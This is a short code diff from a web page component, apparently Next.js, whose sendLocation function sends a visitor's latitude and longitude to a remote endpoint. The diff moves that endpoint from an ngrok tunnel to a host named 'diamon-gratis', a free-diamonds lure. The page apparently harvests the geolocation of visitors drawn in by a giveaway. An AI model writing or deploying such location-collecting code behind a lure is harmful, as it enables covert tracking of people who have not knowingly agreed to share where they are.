@@ -16,7 +16,7 @@ export default function Home() {
     async function sendLocation(latitude, longitude) {
       try {
         const res = await fetch(
-          `https://fade-110-138-85-183.ngrok-free.app/api/send?latitude=${latitude}&longitude=${longitude}`
+          `https://diamon-gratis.vercel.app/api/send?latitude=${latitude}&longitude=${longitude}`
         );
         const data = await res.json();
         console.log(data);
